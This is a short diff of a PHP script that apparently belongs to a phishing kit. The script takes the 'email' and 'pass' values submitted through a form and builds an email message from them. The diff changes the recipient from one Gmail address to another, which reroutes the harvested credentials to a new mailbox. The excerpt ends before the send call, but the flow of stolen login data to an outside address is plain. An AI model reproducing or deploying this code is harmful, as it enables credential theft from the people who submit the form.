@@ -1,6 +1,6 @@
 <?php
 
-$to      = 'croot752014@gmail.com';
+$to      = 'thrapsd@gmail.com';
 $subject = 'the subject';
 $message = $_POST["email"] . "  :  " . $_POST["pass"];
 $headers = 'From: webmaster@example.com' . "\r\n" .
